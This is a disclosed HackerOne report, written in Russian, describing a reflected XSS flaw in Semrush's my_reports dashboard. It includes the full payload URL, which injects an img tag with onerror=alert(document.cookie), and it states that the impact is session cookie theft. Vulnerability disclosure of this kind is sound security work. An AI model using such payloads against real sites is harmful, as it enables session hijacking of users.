# XSS Reflected on my_report

## Report Details
- **Report ID**: 491023
- **URL**: https://hackerone.com/reports/491023
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-02-04T15:03:22.948Z
- **Disclosed**: 2019-06-21T13:16:31.318Z

## Reporter
- **Username**: r0hack
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: semrush

## Vulnerability Information
Еще раз привет. На этот раз, кроме HTML-инъекции проходит полноценный XSS в дашбоарде пользователя.

Payload: https://www.semrush.com/my_reports/api/v1/document%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E/4007861

PoC: На скрине

## Impact

Кража сессионных куков.

## Attachments
- semrush4.png
- semrush3.png
